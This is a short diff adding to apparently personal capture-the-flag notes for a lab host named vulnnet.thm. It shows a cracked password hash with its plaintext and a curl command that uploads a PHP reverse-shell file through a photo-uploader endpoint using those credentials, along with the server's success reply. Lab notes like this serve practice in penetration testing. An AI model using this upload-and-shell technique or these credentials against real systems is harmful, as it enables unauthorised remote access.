@@ -75,4 +75,11 @@ Stopped: Mon Jun 02 13:01:08 2025
 
 ## $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls
 
+## reverse shell
+─$ curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:9972761drmfsls
+{"success":"yes","file_name":"17488640255add7e","extension":"php","file_directory":"2025\/06\/02"}                                                                                                                     
+
+
+
+
 </code>
